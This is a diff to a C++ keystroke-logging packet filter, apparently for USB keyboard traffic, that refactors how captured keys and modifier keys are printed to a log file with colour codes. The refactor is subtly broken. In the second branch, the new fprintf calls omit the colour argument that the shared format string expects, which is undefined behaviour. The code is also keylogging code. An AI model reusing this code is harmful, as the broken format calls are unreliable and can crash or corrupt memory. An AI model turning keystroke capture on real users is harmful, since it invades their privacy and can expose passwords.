@@ -173,23 +173,36 @@ PacketFilter_KeyLogger::PacketFilter_KeyLogger(FILE* _file) {
 	shiftKeyMap[0x64]="|";
 }
 
+#define MOD_LCTRL  0x01
+#define MOD_LSHIFT 0x02
+#define MOD_LALT   0x04
+#define MOD_LWIN   0x08
+#define MOD_RCTRL  0x10
+#define MOD_RSHIFT 0x20
+#define MOD_RALT   0x40
+#define MOD_RWIN   0x80
+
+#define COL_RED  31
+#define COL_BLUE 34
+
 void PacketFilter_KeyLogger::keyPressed(__u8 keyCode,__u8 mods) {
+	const char *fmt_colour = "\033[0;%dm%s\033[0m";
 	if (keyCode) {
-		if (mods & 0x01) { fprintf(file,"\033[0;31m{LCTRL}\033[0m"); }
-		if (mods & 0x04) { fprintf(file,"\033[0;31m{LALT}\033[0m"); }
-		if (mods & 0x08) { fprintf(file,"\033[0;31m{LWIN}\033[0m"); }
-		if (mods & 0x10) { fprintf(file,"\033[0;31m{RCTRL}\033[0m"); }
-		if (mods & 0x40) { fprintf(file,"\033[0;31m{RALT}\033[0m"); }
-		if (mods & 0x80) { fprintf(file,"\033[0;31m{RWIN}\033[0m"); }
-		if ((mods & 0x22) && shiftKeyMap[keyCode]) {
+		if (mods & MOD_LCTRL) { fprintf(file, fmt_colour, COL_RED, "{LCTRL}"); }
+		if (mods & MOD_LALT)  { fprintf(file, fmt_colour, COL_RED, "{LALT}"); }
+		if (mods & MOD_LWIN)  { fprintf(file, fmt_colour, COL_RED, "{LWIN}"); }
+		if (mods & MOD_RCTRL) { fprintf(file, fmt_colour, COL_RED, "{RCTRL}"); }
+		if (mods & MOD_RALT)  { fprintf(file, fmt_colour, COL_RED, "{RALT}"); }
+		if (mods & MOD_RWIN)  { fprintf(file, fmt_colour, COL_RED, "{RWIN}"); }
+		if ((mods & (MOD_LSHIFT | MOD_RSHIFT)) && shiftKeyMap[keyCode]) {
 			if (shiftKeyMap[keyCode][0]=='{' && shiftKeyMap[keyCode][1]!=0) {
-				fprintf(file,"\033[0;34m%s\033[0m",shiftKeyMap[keyCode]);
+				fprintf(file, fmt_colour, COL_BLUE, shiftKeyMap[keyCode]);
 			} else {
 				fprintf(file,"%s",shiftKeyMap[keyCode]);
 			}
 		} else if (keyMap[keyCode]) {
 			if (keyMap[keyCode][0]=='{' && keyMap[keyCode][1]!=0) {
-				fprintf(file,"\033[0;34m%s\033[0m",keyMap[keyCode]);
+				fprintf(file, fmt_colour, COL_BLUE, keyMap[keyCode]);
 			} else {
 				fprintf(file,"%s",keyMap[keyCode]);
 			}
@@ -197,14 +210,14 @@ void PacketFilter_KeyLogger::keyPressed(__u8 keyCode,__u8 mods) {
 			fprintf(file,"{INVALID}");
 		}
 	} else {
-		if (mods & 0x01) { fprintf(file,"\033[0;31m{LCTRL}\033[0m"); }
-		if (mods & 0x02) { fprintf(file,"\033[0;31m{LSHIFT}\033[0m"); }
-		if (mods & 0x04) { fprintf(file,"\033[0;31m{LALT}\033[0m"); }
-		if (mods & 0x08) { fprintf(file,"\033[0;31m{LWIN}\033[0m"); }
-		if (mods & 0x10) { fprintf(file,"\033[0;31m{RCTRL}\033[0m"); }
-		if (mods & 0x20) { fprintf(file,"\033[0;31m{RSHIFT}\033[0m"); }
-		if (mods & 0x40) { fprintf(file,"\033[0;31m{RALT}\033[0m"); }
-		if (mods & 0x80) { fprintf(file,"\033[0;31m{RWIN}\033[0m"); }
+		if (mods & MOD_LCTRL)  { fprintf(file, fmt_colour, "{LCTRL}"); }
+		if (mods & MOD_LSHIFT) { fprintf(file, fmt_colour, "{LSHIFT}"); }
+		if (mods & MOD_LALT)   { fprintf(file, fmt_colour, "{LALT}"); }
+		if (mods & MOD_LWIN)   { fprintf(file, fmt_colour, "{LWIN}"); }
+		if (mods & MOD_RCTRL)  { fprintf(file, fmt_colour, "{RCTRL}"); }
+		if (mods & MOD_RSHIFT) { fprintf(file, fmt_colour, "{RSHIFT}"); }
+		if (mods & MOD_RALT)   { fprintf(file, fmt_colour, "{RALT}"); }
+		if (mods & MOD_RWIN)   { fprintf(file, fmt_colour, "{RWIN}"); }
 	}
 }
 
